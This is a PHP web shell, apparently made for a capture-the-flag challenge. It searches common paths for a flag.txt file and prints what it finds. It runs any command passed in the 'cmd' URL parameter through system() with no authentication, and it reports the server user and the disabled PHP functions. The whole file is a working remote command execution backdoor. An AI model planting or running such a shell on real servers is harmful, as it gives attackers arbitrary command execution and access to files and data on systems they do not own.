<?php
// PHP RCE Webshell - Shows flag by executing commands
echo "<h1>🚩 Flag Retrieval Shell</h1>";
echo "<hr>";

// Try to read flag file directly
$flagPaths = [
    '/flag.txt',
    'flag.txt',
    '../flag.txt',
    '../../flag.txt',
    $_SERVER['DOCUMENT_ROOT'] . '/flag.txt',
    '/var/www/flag.txt'
];

echo "<h2>Attempting to find flags:</h2>";
foreach ($flagPaths as $path) {
    if (file_exists($path) && is_readable($path)) {
        echo "<div style='background:#222;padding:10px;margin:5px;border:1px solid lime;'>";
        echo "<strong>FLAG FOUND at: " . htmlspecialchars($path) . "</strong><br>";
        echo "<pre style='color:lime;'>" . htmlspecialchars(file_get_contents($path)) . "</pre>";
        echo "</div>";
    }
}

// Manual command execution interface
echo "<h2>Command Execution:</h2>";
echo "<form method='GET'>";
echo "Command: <input type='text' name='cmd' value='" . (isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : '') . "' style='width:400px;'>";
echo " <button type='submit'>Execute</button>";
echo "</form>";

// Execute command if provided
if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    echo "<h3>Output:</h3>";
    echo "<pre style='background:#1a1a1a;color:#0f0;padding:10px;border:1px solid lime;'>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "<p>Try commands like: <code>whoami</code>, <code>pwd</code>, <code>ls -la</code>, <code>cat flag.txt</code></p>";
}

// Also show system info
echo "<h2>System Information:</h2>";
echo "<pre>";
echo "User: " . shell_exec('whoami');
echo "Current Dir: " . getcwd() . "\n";
echo "PHP Version: " . phpversion() . "\n";
echo "Disabled Functions: " . ini_get('disable_functions') . "\n";
echo "</pre>";
?>

